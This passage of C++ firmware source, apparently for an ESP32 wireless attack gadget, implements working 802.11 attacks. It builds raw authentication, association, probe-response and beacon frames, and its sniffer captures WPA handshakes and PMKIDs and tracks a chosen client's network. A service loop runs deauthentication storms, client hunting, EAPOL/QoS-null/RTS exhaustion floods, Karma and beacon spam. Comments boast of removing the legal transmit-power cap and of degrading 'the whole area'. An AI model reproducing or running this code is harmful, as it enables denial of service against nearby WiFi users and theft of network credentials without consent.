  int pktLen;
  uint8_t client[6]; randomClientMAC(client);
  memcpy_P(pkt, AUTH_TMPL, 30);
  memcpy(&pkt[4],  bssid,  6);
  memcpy(&pkt[10], client, 6);
  memcpy(&pkt[16], bssid,  6);
  if(channel > 14){
    memcpy_P(&pkt[30], HT_CAPS, 28);
    pktLen = 58;
  } else {
    pktLen = 30;
  }
  setChannel(channel);
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, pktLen, false);
    sTxCount++; sWinCount++;
  }
}

// ---------------------------------------------------------------------------
// Association request frame with randomized client MAC
// ---------------------------------------------------------------------------
static void txAssocFrame(const uint8_t* bssid, const char* ssid, uint8_t channel){
  if(!bssid || !ssid) return;
  uint8_t ssidLen = (uint8_t)strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;

  static const uint8_t ASSOC_TMPL[28] PROGMEM = {
    0x00,0x00,
    0x3A,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    0x01,0x04,
    0x0A,0x00
  };
  static const uint8_t RATES_2G[10] PROGMEM = { 0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24 };
  static const uint8_t RATES_5G[10] PROGMEM = { 0x01,0x08,0x8C,0x12,0x98,0x24,0xB0,0x48,0x60,0x6C };
  static const uint8_t VHT_CAPS[14] PROGMEM = {
    0xBF,0x0C,
    0x32,0x00,0x80,0x03,
    0xFA,0xFF,0x00,0x00,
    0xFA,0xFF,0x00,0x00
  };
  static const uint8_t EXT_CAPS[10] PROGMEM = { 0x7F,0x08,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x40 };

  uint8_t pkt[256];
  memcpy_P(pkt, ASSOC_TMPL, 28);
  uint8_t client[6]; randomClientMAC(client);
  memcpy(&pkt[4],  bssid,  6);
  memcpy(&pkt[10], client, 6);
  memcpy(&pkt[16], bssid,  6);

  int idx = 28;
  pkt[idx++] = 0x00; pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen); idx += ssidLen;

  if(channel > 14) { memcpy_P(&pkt[idx], RATES_5G, 10); }
  else             { memcpy_P(&pkt[idx], RATES_2G, 10); }
  idx += 10;

  if(channel > 14){
    pkt[idx++]=0x32; pkt[idx++]=0x04; pkt[idx++]=0x30; pkt[idx++]=0x48; pkt[idx++]=0x60; pkt[idx++]=0x6C;
  }

  memcpy_P(&pkt[idx], HT_CAPS, 28); idx += 28;
  if(channel > 14){ memcpy_P(&pkt[idx], VHT_CAPS, 14); idx += 14; }
  memcpy_P(&pkt[idx], EXT_CAPS, 10); idx += 10;

  setChannel(channel);
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
    sTxCount++; sWinCount++;
  }
}

// ---------------------------------------------------------------------------
// Probe response (used by AP spoofing and Karma)
// ---------------------------------------------------------------------------
static void txProbeResponse(const uint8_t* bssid, const char* ssid, uint8_t channel, const uint8_t* destMac){
  if(!bssid || !ssid || !destMac) return;
  uint8_t ssidLen = (uint8_t)strlen(ssid);
  if(ssidLen > 32) ssidLen = 32;

  static const uint8_t PROBE_RESP[38] PROGMEM = {
    0x50,0x00, 0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,
    0xE8,0x03,
    0x11,0x04
  };

  uint8_t pkt[128];
  memcpy_P(pkt, PROBE_RESP, 38);
  memcpy(&pkt[4],  destMac, 6);
  memcpy(&pkt[10], bssid,   6);
  memcpy(&pkt[16], bssid,   6);

  int idx = 38;
  pkt[idx++] = 0x00; pkt[idx++] = ssidLen;
  memcpy(&pkt[idx], ssid, ssidLen); idx += ssidLen;

  static const uint8_t RATES[10] PROGMEM = { 0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24 };
  memcpy_P(&pkt[idx], RATES, 10); idx += 10;
  pkt[idx++] = 0x03; pkt[idx++] = 0x01; pkt[idx++] = channel;

  setChannel(channel);
  for(uint8_t i=0;i<burstCount();i++){
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, idx, false);
    sTxCount++; sWinCount++;
  }
}

// ---------------------------------------------------------------------------
// Promiscuous sniffer (unified): feeds UI monitor counters, EAPOL detection,
// station discovery and Karma probe capture.
// ---------------------------------------------------------------------------
static void IRAM_ATTR unifiedSniffer(void* buf, wifi_promiscuous_pkt_type_t type){
  if(!buf) return;
  const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t*)buf;
  const uint16_t len = p->rx_ctrl.sig_len;
  const uint8_t  ch  = p->rx_ctrl.channel;
  const int8_t   rssi= (int8_t)p->rx_ctrl.rssi;
  const uint8_t *d   = p->payload;

  snifferHookMonitor(type, 0, ch, len);          // UI counts raw frames by type

  if(type == WIFI_PKT_DATA){
    // V25: EAPOL frames arrive as REGULAR data (LLC/SNAP at byte 24) AND as
    // QoS data (2 extra bytes, LLC/SNAP at 26 - every WMM router today, which
    // is why the old fixed-offset check never saw a handshake), plus the rare
    // +HTC variant (4 more bytes when the Order bit is set).
    uint16_t off = 24;
    if(len >= 2){
      uint8_t sub = (uint8_t)((d[0] >> 4) & 0x0F);
      bool qos = (sub >= 0x08);
      if(qos) off += 2;
      if(qos && (d[1] & 0x80)) off += 4;
    }
    // EAPOL (802.1X) detection: LLC/SNAP header, ethertype 88 8E
    if(len >= (uint16_t)(off+12) &&
       d[off]==0xAA && d[off+1]==0xAA && d[off+2]==0x03 && d[off+3]==0x00 && d[off+4]==0x00 && d[off+5]==0x00 &&
       d[off+6]==0x88 && d[off+7]==0x8E){
      snifferHookEAPOL(ch);
      // Advanced handshake + PMKID analysis while a capture attack runs.
      // EAPOL frame layout (base = off+8): ver@+0 type@+1 len@+2-3,
      // body: desc@+4 keyInfo@+5-6 (BE) keyLen@+7-8 replay@+9-16
      // nonce@+17-48 ... keyData@+99+ (KDE list)
      const uint16_t base = off + 8;
      if((sType==AttackType::HS_CAPTURE || sType==AttackType::PMKID_GRAB) && len>=(uint16_t)(base+7) && d[base+1]==0x03){
        const uint8_t *a1=&d[4], *a2=&d[10], *a3=&d[16];
        const uint8_t *bap = (!macBroadcast(a3)&&!macNull(a3))?a3
                           : ((!macBroadcast(a2)&&!macNull(a2))?a2:a1);
        if(memcmp(sHS.bssid,bap,6)!=0){ memcpy(sHS.bssid,bap,6); sHS.channel=ch; }
        uint16_t ki = (uint16_t)((d[base+5]<<8)|d[base+6]);
        bool ack    = (ki & 0x0080)!=0;
        bool mic    = (ki & 0x0100)!=0;
        bool secure = (ki & 0x0200)!=0;
        if(ack && !mic && !secure){
          sHS.m1 = true;
          // V25: PMKID KDE scan over the REAL key-data region (base+99). The
          // old code probed a fixed byte inside the IV field and never fired.
          if(!sHS.pmkidOK && len > (uint16_t)(base+99+8)){
            const uint16_t kd0 = (uint16_t)(base+99);
            const uint16_t kd1 = (uint16_t)((len>4)?len-4:len);
            for(uint16_t q=kd0; q+8<=kd1; q++){
              if(d[q]==0xDD && d[q+2]==0x00 && d[q+3]==0x0F && d[q+4]==0xAC && d[q+5]==0x04 && d[q+6]==0x01){
                memcpy(sHS.pmkid,&d[q+7],16);
                sHS.pmkidOK=true;
                break;
              }
            }
          }
        }
        else if(!ack && mic && !secure) sHS.m2 = true;
        else if(ack && mic && secure)   sHS.m3 = true;
        else if(!ack && mic && secure)  sHS.m4 = true;
        if(!sHS.complete) sHS.complete = (sHS.m1 && sHS.m2);
        hsRingPush(d,(uint16_t)len,ch);
      }
    }
    // V25 FIND WIFI: every frame that involves the hunted device names its AP.
    if(sType == AttackType::FIND_WIFI && len >= 24 && sFindHasSta){
      const uint8_t *addr1 = &d[4];
      const uint8_t *addr2 = &d[10];
      const uint8_t *addr3 = &d[16];
      const uint8_t *other = nullptr;
      if(!macBroadcast(addr2)&&!macNull(addr2)&&memcmp(addr2,sFindSta,6)==0)      other = addr1; // client -> BSSID
      else if(!macBroadcast(addr1)&&!macNull(addr1)&&memcmp(addr1,sFindSta,6)==0) other = addr2; // BSSID -> client
      else if(!macBroadcast(addr3)&&!macNull(addr3)&&memcmp(addr3,sFindSta,6)==0) other = addr1;
      if(other && other!=sFindSta) findObserveAP(other, ch, rssi);
    }
    // Station discovery (V20): ANY unicast data frame links a client MAC to
    // an AP. All four address-direction combinations are handled; unknown APs
    // are stored as zeros and the client keeps its last-heard channel.
    if(len >= 24){
      const uint8_t *addr1 = &d[4];
      const uint8_t *addr2 = &d[10];
      const uint8_t *addr3 = &d[16];
      if(macBroadcast(addr1) || macBroadcast(addr2) || macMulticast(addr1) || macMulticast(addr2)) return;
      uint8_t flags = d[1];
      bool toDS   = (flags & 0x01) != 0;
      bool fromDS = (flags & 0x02) != 0;
      if(toDS && !fromDS){       addOrUpdateSTA(addr2, addr1, ch, rssi); return; }
      else if(!toDS && fromDS){  addOrUpdateSTA(addr1, addr2, ch, rssi); return; }
      else if(toDS && fromDS){   addOrUpdateSTA(addr2, addr3, ch, rssi); return; }  // WDS
      else {                     addOrUpdateSTA(addr2, addr3, ch, rssi); return; }  // ad-hoc / IBSS
    }
    return;
  }

  if(type == WIFI_PKT_MGMT && len >= 28){
    uint8_t subtype = (uint8_t)((d[0] >> 4) & 0x0F);
    // Probe request (subtype 4): capture sender for Karma / AP-spoof replies
    // and as a station sighting during the station scan.
    if(subtype == 0x04 && (sKarmaActive || sType == AttackType::SPOOF_AP || sType == AttackType::PROBE_FLOOD || sStaScanActive)){
      if(sStaScanActive) addOrUpdateSTA(&d[10], nullptr, ch, rssi);
      if(sProbeQ.size() < 16){
        ProbeReq pr;
        memcpy(pr.sender, &d[10], 6);
        pr.channel = ch; pr.ts = millis();
        sProbeQ.push_back(pr);
      }
    }
    // V25 FIND WIFI over management frames: probe requests from the hunted
    // device leak the network NAME (hidden networks included); auth/assoc
    // requests reveal the BSSID; once locked, that AP's beacons give the name.
    if(sType == AttackType::FIND_WIFI && sFindHasSta){
      const uint8_t *sa = &d[10];
      const uint8_t *a1 = &d[4];
      const uint8_t *a3 = &d[16];
      bool fromClient = (!macBroadcast(sa)&&!macNull(sa)&&memcmp(sa,sFindSta,6)==0);
      if(subtype == 0x04 && fromClient){
        char nm[33];
        if(copySSIDFromIE(d, 24, len, nm)) findNoteSsid(nullptr, nm);
        // hidden-SSID probe: no name inside - the AP reveal happens on the
        // data/auth/assoc path or on the locked candidate's beacon
      } else if((subtype == 0x00 || subtype == 0x02 || subtype == 0x0B) && fromClient){
        findObserveAP(a1, ch, rssi);                     // assoc/auth -> BSSID
      } else if((subtype == 0x08 || subtype == 0x05) && sFindLock >= 0){
        // beacon / probe response from the locked candidate -> name
        if(!macNull(a3) && memcmp(a3, sFindNets[sFindLock].bssid, 6)==0){
          char nm[33];
          if(copySSIDFromIE(d, 36, len, nm)) findNoteSsid(a3, nm);
          else findNoteSsid(a3, nullptr);                // hidden beacon
          sFindNets[sFindLock].lastSeen = millis();
        }
      }
    }
    // Assoc / re-assoc / auth requests (V20): reveal active clients plus
    // their exact BSSID without any data traffic.
    if(sStaScanActive && (subtype == 0x00 || subtype == 0x02 || subtype == 0x0B) && len >= 28){
      addOrUpdateSTA(&d[10], &d[16], ch, rssi);
    }
  }
}

static void promiscEnable(){
  if(sPromiscOn) return;
  wifi_promiscuous_filter_t filter{};
  filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&unifiedSniffer);
  esp_wifi_set_promiscuous(true);
  sPromiscOn = true;
}

static void promiscDisable(){
  if(!sPromiscOn) return;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  sPromiscOn = false;
}

// ---------------------------------------------------------------------------
// Station scan (promiscuous, hops channels that hold known APs)
// ---------------------------------------------------------------------------
static bool staScanStart(){
  if(sStaScanActive) return true;
  if(sKnownAPs.empty()){
    Serial.println("[STA] scan aborted: no known APs, run an AP scan first");
    return false;
  }
  // V25: the accumulated station list is KEPT between scans ("van y
  // desaparecen" fix) - rescan refreshes it instead of wiping it.
  sStaScanChIdx = 0;
  sStaScanLastHop = 0;
  sStaScanActive = true;
  sortSTAsByRSSI();                      // strongest clients first on open
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  sChannelPinned = false;                // scan owns the radio now
  setChannel(SCAN_CHANNELS[0]);
  promiscEnable();
  Serial.println("[STA] progressive station scan started");
  return true;
}

static void staScanStop(){
  if(!sStaScanActive) return;
  sStaScanActive = false;
  promiscDisable();
  Serial.printf("[STA] scan stopped, %u stations\n", (unsigned)sSTAs.size());
}

static bool staScanActive(){ return sStaScanActive; }

static void staScanService(){
  if(!sStaScanActive) return;
  uint32_t now = millis();
  // V20: dwell longer on channels that hold known APs (most live client
  // traffic lives there) but still visit every channel so probe-only
  // clients and unlisted networks are captured too.
  // V22: the station scan follows ATTACK POWER like every other radio job -
  // LOW sweeps fast (380/220 ms), MED keeps the tuned V20 balance,
  // MAX listens deep (800/520 ms) to catch silent/bursty clients.
  bool hasAP = false;
  for(auto &ap : sKnownAPs) if(ap.channel == SCAN_CHANNELS[sStaScanChIdx]){ hasAP = true; break; }
  uint32_t dwellAP = 550u, dwellOpen = 320u;
  switch(powerLevel()){
    case Power::PWR_LOW: dwellAP = 380u; dwellOpen = 220u; break;
    case Power::PWR_MAX: dwellAP = 800u; dwellOpen = 520u; break;
    default: break;
  }
  uint32_t dwell = hasAP ? dwellAP : dwellOpen;
  if(now - sStaScanLastHop < dwell) return;
  sStaScanLastHop = now;
  for(uint8_t step=0; step<SCAN_CHANNEL_COUNT; ++step){
    uint8_t idx = (uint8_t)((sStaScanChIdx + 1) % SCAN_CHANNEL_COUNT);
    sStaScanChIdx = idx;
    uint8_t ch = SCAN_CHANNELS[idx];
    if(setChannel(ch)) break;
  }
  staSweep();
}

// ---------------------------------------------------------------------------
// Rickroll SSID list (classic deauther joke)
// ---------------------------------------------------------------------------
static const char* const RICKROLL_SSIDS[] = {
  "Never Gonna Give You Up",
  "Never Gonna Let You Down",
  "Never Gonna Run Around",
  "And Desert You",
  "Never Gonna Make You Cry",
  "Never Gonna Say Goodbye",
  "Never Gonna Tell A Lie",
  "And Hurt You",
  "You Have Been Rickrolled",
  "Rick Astley  01:43",
  "LOL GET RICKROLLED",
  "download-more-ram.page"
};
static constexpr uint8_t RICKROLL_COUNT = sizeof(RICKROLL_SSIDS)/sizeof(RICKROLL_SSIDS[0]);

// ---------------------------------------------------------------------------
// Attack lifecycle
// ---------------------------------------------------------------------------
static bool attackRunning(){ return sRunning; }
static AttackType attackType(){ return sType; }
static const String& attackTitle(){ return sTitle; }
static const String& attackTarget(){ return sTarget; }
static uint32_t attackTxCount(){ return sTxCount; }
static uint32_t attackRate(){ return sRate; }
static uint32_t attackSweeps(){ return sSweepCount; }
static uint8_t  attackChannel(){ return sChannel; }
static uint32_t attackStartedMs(){ return sStartedMs; }
static bool     attackUsesBLE(){ return sUseBLE; }

static void stopBLELink(){
  sUseBLE = false;
  sBLELink = BLELink::NONE;
  bleSpamStopBridge();    // idempotent: stops BLE spam if it was running
}

static void attackStop(){
  if(!sRunning && !sKarmaActive) return;
  sRunning = false;
  sKarmaActive = false;
  sType = AttackType::NONE;
  sTargets.clear();
  sStaTargets.clear();
  sProbeQ.clear();
  stopBLELink();
  promiscDisable();
  hookDualAttackStop();   // V23.2 DUAL MODE: release the auto drone link
  Serial.println("[ATTACK] stopped");
}

static void attackRateTick(){
  uint32_t now = millis();
  if(now - sWinLastMs >= 1000){
    sRate = sWinCount;
    sWinCount = 0;
    sWinLastMs = now;
  }
}

// Pre-flight: force STA radio, no connection, no power save, max RF power.

// V23.2 DUAL MODE: build the POD target list for the drone hook - AP targets
// first, then STA targets (a station whose AP is unknown becomes a broadcast
// channel jam on the channel it was heard on).
static constexpr size_t DUAL_HOOK_MAX = 16;
static void dualNotifyStart(const char* title){
  DualTarget dts[DUAL_HOOK_MAX];
  size_t n = 0;
  for(size_t i=0;i<sTargets.size() && n<DUAL_HOOK_MAX;i++){
    memcpy(dts[n].bssid, sTargets[i].bssid, 6);
    dts[n].channel = sTargets[i].channel;
    n++;
  }
  for(size_t i=0;i<sStaTargets.size() && n<DUAL_HOOK_MAX;i++){
    const TargetSTA &s = sStaTargets[i];
    if((s.ap[0]|s.ap[1]|s.ap[2]|s.ap[3]|s.ap[4]|s.ap[5]) == 0)
      memset(dts[n].bssid, 0xFF, 6);          // unknown AP: jam the whole channel
    else
      memcpy(dts[n].bssid, s.ap, 6);
    dts[n].channel = s.channel;
    n++;
  }
  hookDualAttackStart(title, dts, n);
}

// V23.1: TX power UNLEASHED. Units are quarter-dBm: 84 = 21 dBm = the
// absolute maximum the driver accepts (the C5 RF front end then runs at its
// calibrated ceiling, ~20 dBm on 2.4 GHz). NO legal/regulatory cap is
// applied - same policy as the SX-DRONE firmware. Re-asserted at every
// attack start and after every softAP start because band recalibration can
// drop the override.
static void unleashTx(){
  esp_wifi_set_max_tx_power(84);
  int8_t applied = 0;
  if(esp_wifi_get_max_tx_power(&applied) == ESP_OK)
    Serial.printf("[RF] TX UNLEASHED: chip applied max %d/4 dBm (NO legal cap)\n", (int)applied);
  else
    Serial.println("[RF] TX UNLEASHED: 21 dBm requested (NO legal cap)");
}

static void radioPrepare(){
  if(WiFi.status() == WL_CONNECTED) WiFi.disconnect(false, false);
  WiFi.mode(WIFI_STA);
  WiFi.setSleep(false);
  delay(20);
  esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
  sChannelPinned = false;          // V25: band recalibration can move the radio
  unleashTx();                     // absolute chip maximum, NO legal cap
}

static bool attackStart(AttackType type, const char* title, const char* targetLabel,
                        std::vector<TargetAP> targets = std::vector<TargetAP>(),
                        std::vector<TargetSTA> staTargets = std::vector<TargetSTA>()){
  radioPrepare();
  sRunning = true;
  sKarmaActive = false;
  sType = type;
  sTitle = title;
  sTarget = targetLabel;
  sTargets = targets;
  sStaTargets = staTargets;
  sTxCount = 0; sWinCount = 0; sRate = 0;
  sWinLastMs = millis(); sStartedMs = millis(); sLastTickMs = 0;
  sSweepCount = 0; sCurTarget = 0; sHopIdx = 0; sBeaconRotate = 0;
  sLastDeauthBurst = 0; sLastProbeResp = 0; sLastHopMs = 0;
  sUseBLE = false; sBLELink = BLELink::NONE;
  if(type==AttackType::HS_CAPTURE || type==AttackType::PMKID_GRAB) hsResetTargets();

  if(!sTargets.empty()) sChannel = sTargets[0].channel;
  // Sniffer-fed attacks need the promiscuous receiver running from frame 0.
  if(type==AttackType::PROBE_FLOOD || type==AttackType::CLIENT_HUNT){
    setChannel(sTargets.empty() ? ATTACK_CHANNELS[0] : sTargets[0].channel);
    promiscEnable();
  } else if(type==AttackType::HS_CAPTURE || type==AttackType::PMKID_GRAB || type==AttackType::FIND_WIFI){
    // V25: receiver-critical attacks enable the sniffer HERE (frame 0) and
    // pin the first channel once - never per tick (RX starvation).
    if(type!=AttackType::FIND_WIFI && !sTargets.empty()) setChannel(sTargets[0].channel);
    promiscEnable();
  } else {
    promiscDisable();
  }
  // V25: FIND WIFI is a discovery attack - the drone cannot help (it does
  // not sniff), so dual mode stays out of its way.
  if(type != AttackType::FIND_WIFI) dualNotifyStart(title);
  Serial.printf("[ATTACK] start type=%u targets=%u stas=%u\n",
    (unsigned)type, (unsigned)sTargets.size(), (unsigned)sStaTargets.size());
  return true;
}

static bool karmaStart(){
  radioPrepare();
  sRunning = true;
  sKarmaActive = true;
  sType = AttackType::PROBE_KARMA;
  sTitle = "PROBE KARMA FLOOD";
  sTarget = "ALL PROBE REQUESTS";
  sTxCount = 0; sWinCount = 0; sRate = 0;
  sWinLastMs = millis(); sStartedMs = millis(); sLastTickMs = 0;
  sProbeQ.clear();
  sHopIdx = 0;
  setChannel(ATTACK_CHANNELS[0]);
  promiscEnable();
  hookDualAttackStart("PROBE KARMA FLOOD", nullptr, 0);   // V23.2 DUAL MODE
  Serial.println("[ATTACK] probe karma flood started");
  return true;
}

static bool karmaActive(){ return sKarmaActive; }

// ---------------------------------------------------------------------------
// Attack service: call from loop(); non-blocking paced TX slices.
// ---------------------------------------------------------------------------
static void service(){
  if(!sRunning) return;
  attackRateTick();

  // Karma: respond to captured probe requests with random SSIDs
  if(sType == AttackType::PROBE_KARMA){
    if(sProbeQ.empty()) return;
    uint32_t now = millis();
    if(now - sLastTickMs < 6u*tickMul()) return;
    sLastTickMs = now;
    ProbeReq pr = sProbeQ.back(); sProbeQ.pop_back();
    uint8_t bssid[6]; randomBSSID(bssid);
    char ssid[13]; randomSSID(ssid, sizeof(ssid)-1);
    txProbeResponse(bssid, ssid, pr.channel, pr.sender);
    return;
  }

  uint32_t now = millis();

  switch(sType){
    // ---------------- Deauth family ----------------
    case AttackType::DEAUTH_ALL:
    case AttackType::DEAUTH_CHANNEL:
    case AttackType::DEAUTH_SELECTED:
    {
      if(sTargets.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 6u*tickMul()) return;
      sLastTickMs = now;
      const TargetAP &t = sTargets[sCurTarget];
      txDeauthBSSID(t.bssid, t.channel);
      // Two-way pressure: a burst of client->AP logoffs keeps the AP busy
      // tearing down state, making the outage stick between sweeps.
      if((sSweepCount & 1) == 1) txDeauthFromClient(t.bssid, t.channel);
      sCurTarget = (sCurTarget + 1) % sTargets.size();
      if(sCurTarget == 0) sSweepCount++;
      break;
    }
    case AttackType::DEAUTH_TWO_WAY:
    {
      if(sTargets.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 5u*tickMul()) return;
      sLastTickMs = now;
      // Full bidirectional assault on one AP per tick:
      //  1) AP -> broadcast (all clients told to leave, rotating reasons)
      //  2) fake clients -> AP (state teardown pressure on the AP itself)
      const TargetAP &t = sTargets[sCurTarget];
      txDeauthBSSID(t.bssid, t.channel);
      txDeauthFromClient(t.bssid, t.channel);
      // Kick known clients of this AP directly when the sniffer knows them.
      for(auto &s : sSTAs){
        if(memcmp(s.ap, t.bssid, 6) == 0) txDeauthSTA(s.sta, t.bssid, t.channel);
      }
      sCurTarget = (sCurTarget + 1) % sTargets.size();
      if(sCurTarget == 0) sSweepCount++;
      break;
    }
    case AttackType::CLIENT_HUNT:
    {
      if(sTargets.empty()){ attackStop(); return; }
      promiscEnable();                       // keep RX alive while kicking
      const TargetAP &t = sTargets[0];
      // V25: channel pinned once at start; re-pin only on drift (per-tick
      // setChannel starved the sniffer that feeds this very attack).
      if(!sChannelPinned || sChannel != t.channel) setChannel(t.channel);
      if(now - sLastTickMs < 30u*tickMul()) break;
      sLastTickMs = now;
      // Phase A: short deauth pulse on the AP itself (clients reconnect and
      //          generate fresh traffic). Phase B: kick every client the
      //          sniffer has tied to this AP. The registry is fed live by
      //          the promiscuous callback on this channel.
      if((sSweepCount & 1) == 0){
        txDeauthBSSID(t.bssid, t.channel);
      } else {
        uint8_t kicked = 0;
        for(auto &s : sSTAs){
          if(memcmp(s.ap, t.bssid, 6) != 0) continue;
          txDeauthSTA(s.sta, t.bssid, t.channel);
          if(++kicked >= 8) break;
        }
      }
      sSweepCount++;
      break;
    }
    case AttackType::EAPOL_FLOOD:
    case AttackType::QOS_NULL_FLOOD:
    case AttackType::RTS_FLOOD:
    {
      // V20 exhaustion attacks: fire a dedicated frame storm at the target.
      // With no explicit target the pressure sweeps every known AP channel
      // by channel, so the whole area degrades instead of one network.
      if(sTargets.empty() && sKnownAPs.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 8u*tickMul()) return;
      sLastTickMs = now;
      if(!sTargets.empty()){
        const TargetAP &t = sTargets[sCurTarget % sTargets.size()];
        if(sType == AttackType::EAPOL_FLOOD)        txEapolStart(t.bssid, t.channel);
        else if(sType == AttackType::QOS_NULL_FLOOD) txQosNull(t.bssid, t.channel);
        else                                         txRtsFrame(t.bssid, t.channel);
        sCurTarget = (sCurTarget + 1) % sTargets.size();
      } else {
        uint8_t ch = ATTACK_CHANNELS[sHopIdx];
        setChannel(ch);
        for(auto &t : sKnownAPs) if(t.channel == ch){
          if(sType == AttackType::EAPOL_FLOOD)        txEapolStart(t.bssid, ch);
          else if(sType == AttackType::QOS_NULL_FLOOD) txQosNull(t.bssid, ch);
          else                                         txRtsFrame(t.bssid, ch);
        }
        sHopIdx = (uint8_t)((sHopIdx + 1) % ATTACK_CHANNEL_COUNT);
      }
      sSweepCount++;
      break;
    }
    case AttackType::PROBE_FLOOD:
    {
      // Answers every captured probe with a swarm of random networks, so
      // nearby scanners fill with dozens of entries per second.
      if(!sProbeQ.empty() && (now - sLastTickMs >= 4u*tickMul())){
        sLastTickMs = now;
        ProbeReq pr = sProbeQ.back(); sProbeQ.pop_back();
        for(uint8_t k=0;k<4;k++){                 // 4 fake networks per probe
          uint8_t b2[6]; randomBSSID(b2);
          char s2[13]; randomSSID(s2, sizeof(s2)-1);
          txProbeResponse(b2, s2, pr.channel, pr.sender);
        }
      }
      // Hop to harvest probes on every channel.
      if(now - sLastHopMs >= 300){
        sLastHopMs = now;
        setChannel(ATTACK_CHANNELS[sHopIdx]);
        sHopIdx = (uint8_t)((sHopIdx + 1) % ATTACK_CHANNEL_COUNT);
        sSweepCount++;
      }
      break;
    }
    case AttackType::DEAUTH_STA_SELECTED:
    case AttackType::DEAUTH_STA_ALL:
    {
      if(sStaTargets.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 8u*tickMul()) return;
      sLastTickMs = now;
      const TargetSTA &s = sStaTargets[sCurTarget];
      txDeauthSTA(s.sta, s.ap, s.channel);
      txDisassocSTA(s.sta, s.ap, s.channel);
      sCurTarget = (sCurTarget + 1) % sStaTargets.size();
      if(sCurTarget == 0) sSweepCount++;
      break;
    }
    case AttackType::DEAUTH_STORM:
    {
      if(now - sLastTickMs < 12u*tickMul()) return;
      sLastTickMs = now;
      uint8_t ch = ATTACK_CHANNELS[sHopIdx];
      setChannel(ch);
      bool any = false;
      for(auto &t : sKnownAPs){
        if(t.channel == ch){ txDeauthBSSID(t.bssid, ch); any = true; }
      }
      for(auto &s : sSTAs){
        int apIdx = findKnownAP(s.ap);
        if(apIdx < 0) continue;
        if(sKnownAPs[apIdx].channel != ch) continue;
        txDeauthSTA(s.sta, s.ap, ch);
      }
      (void)any;
      sHopIdx = (uint8_t)((sHopIdx + 1) % ATTACK_CHANNEL_COUNT);
      sSweepCount++;
      break;
    }

    // ---------------- Auth / Assoc floods ----------------
    case AttackType::AUTH_ALL:
    case AttackType::AUTH_CHANNEL:
    case AttackType::AUTH_SELECTED:
    {
      if(sTargets.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 8u*tickMul()) return;
      sLastTickMs = now;
      const TargetAP &t = sTargets[sCurTarget];
      txAuthFrame(t.bssid, t.channel);
      sCurTarget = (sCurTarget + 1) % sTargets.size();
      if(sCurTarget == 0) sSweepCount++;
      break;
    }
    case AttackType::ASSOC_ALL:
    case AttackType::ASSOC_CHANNEL:
    case AttackType::ASSOC_SELECTED:
    {
      if(sTargets.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 10u*tickMul()) return;
      sLastTickMs = now;
      const TargetAP &t = sTargets[sCurTarget];
      const char *ssid = (t.ssid[0]) ? t.ssid : "Network";
      txAssocFrame(t.bssid, ssid, t.channel);
      sCurTarget = (sCurTarget + 1) % sTargets.size();
      if(sCurTarget == 0) sSweepCount++;
      break;
    }

    // ---------------- Beacon family ----------------
    case AttackType::BEACON_DUP_ALL:
    case AttackType::BEACON_DUP_SELECTED:
    case AttackType::BEACON_CHANNEL:
    {
      if(sTargets.empty()){ attackStop(); return; }
      if(now - sLastTickMs < 12u*tickMul()) return;
      sLastTickMs = now;
      const TargetAP &t = sTargets[sCurTarget];
      const char *ssid = (t.ssid[0]) ? t.ssid : "Network";
      txBeaconFrame(ssid, t.channel, t.bssid, t.encrypted);
      sCurTarget = (sCurTarget + 1) % sTargets.size();
      if(sCurTarget == 0) sSweepCount++;
      break;
    }
    case AttackType::BEACON_RANDOM:
    {
      if(now - sLastTickMs < 10u*tickMul()) return;
      sLastTickMs = now;
      uint8_t bssid[6]; randomBSSID(bssid);
      char ssid[13]; randomSSID(ssid, sizeof(ssid)-1);
      uint8_t ch = ATTACK_CHANNELS[sBeaconRotate % ATTACK_CHANNEL_COUNT];
      sBeaconRotate++;
      txBeaconFrame(ssid, ch, bssid, false);
      sSweepCount++;
      break;
    }
    case AttackType::BEACON_PREFIX:
    {
      if(now - sLastTickMs < 10u*tickMul()) return;
      sLastTickMs = now;
      uint8_t bssid[6]; randomBSSID(bssid);
      String name = sBeaconPrefix + "-" + String(random(10,100));
      uint8_t ch = ATTACK_CHANNELS[sBeaconRotate % ATTACK_CHANNEL_COUNT];
      sBeaconRotate++;
      txBeaconFrame(name.c_str(), ch, bssid, false);
      sSweepCount++;
      break;
    }
    case AttackType::BEACON_RICKROLL:
    {
      if(now - sLastTickMs < 10u*tickMul()) return;
      sLastTickMs = now;
      uint8_t bssid[6]; randomBSSID(bssid);
      const char *ssid = RICKROLL_SSIDS[sBeaconRotate % RICKROLL_COUNT];
      sBeaconRotate++;
      uint8_t ch = ATTACK_CHANNELS[sBeaconRotate % ATTACK_CHANNEL_COUNT];
      txBeaconFrame(ssid, ch, bssid, false);
      sSweepCount++;
      break;
    }
    case AttackType::BEACON_FAKERANDOM:
    {
      if(now - sLastTickMs < 6u*tickMul()) return;
      sLastTickMs = now;
